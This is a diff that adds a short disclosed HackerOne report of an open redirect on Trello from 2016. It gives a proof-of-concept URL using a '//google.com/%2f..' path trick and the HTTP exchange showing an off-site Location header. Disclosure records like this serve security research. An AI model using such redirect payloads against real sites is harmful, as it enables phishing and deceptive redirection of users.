@@ -1,0 +1,23 @@
+ReportLink:https://hackerone.com/reports/45513
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Trello(trello)
+BountyAmount:64.0
+Severity:
+State:Closed
+DateOfDisclosure:25.09.2016 16:15:35
+
+Summary:
+
+PoC:
+[https://trello.com//google.com/%2f..](https://trello.com//google.com/%2f..)
+
+
+HTTP Request:
+> GET //google.com/%2f.. HTTP/1.1
+> Host: trello.com
+
+HTTP Response:
+> HTTP/1.1 303 See Other
+> ...
+> Location: //google.com/%2f../
